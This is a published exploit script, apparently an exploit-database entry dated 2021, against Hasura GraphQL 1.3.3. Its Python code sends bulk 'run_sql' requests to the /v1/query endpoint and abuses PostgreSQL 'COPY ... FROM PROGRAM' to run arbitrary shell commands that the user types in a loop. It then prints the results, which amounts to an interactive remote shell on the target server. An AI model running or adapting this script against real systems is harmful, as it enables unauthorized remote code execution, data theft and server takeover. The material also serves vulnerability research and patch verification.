# Exploit Title: Hasura GraphQL 1.3.3 - Remote Code Execution
# Software: Hasura GraphQL
# Software Link: https://github.com/hasura/graphql-engine
# Version: 1.3.3
# Exploit Author: Dolev Farhi
# Date: 4/23/2021
# Tested on: Ubuntu

import requests
import sys

HASURA_SCHEME = 'http'
HASURA_HOST = '192.168.0.1'
HASURA_PORT = 80

print('Start typing shell commands...')

while True:
  cmd = input('cmd $> ')
  data =  { "type":"bulk",
            "args":[
              {
                "type":"run_sql",
                "args":{
                  "sql":"SET LOCAL statement_timeout = 10000;","cascade":False,"read_only":False}
              },
              {
                "type":"run_sql",
                "args":{
                  "sql":"DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM '" + cmd + "';\nSELECT * FROM cmd_exec;","cascade":False,"read_only":False}
              }
            ]
           }
  endpoint = '{}://{}:{}/v1/query'.format(HASURA_SCHEME, HASURA_HOST, HASURA_PORT)
  r = requests.post(endpoint, json=data)
  if r.ok:
    try:
      for i in r.json()[1]['result']:
        print(''.join(i))
    except:
      print(r.json())
